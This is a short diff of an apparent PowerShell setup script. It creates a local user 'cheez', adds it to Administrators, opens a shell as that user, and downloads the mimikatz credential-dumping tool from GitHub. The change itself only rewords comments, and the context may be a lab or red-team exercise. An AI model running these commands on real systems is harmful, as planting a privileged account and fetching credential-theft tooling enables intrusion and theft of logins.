@@ -107,9 +107,10 @@ Add to cheez.ps1
 New-LocalUser "cheez" -Password (ConvertTo-SecureString -AsPlainText -String '****' -Force)
 Add-LocalGroupMember -Group "Administrators" -Member "cheez"
 
-#Logon as cheez (Exeute steps after this as cheez)
+#Logon as cheez
 runas /user:cheez powershell.exe
 
+#Exeute below as cheez
 #Download mimikatz
 #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "mimikatz_trunk.zip"
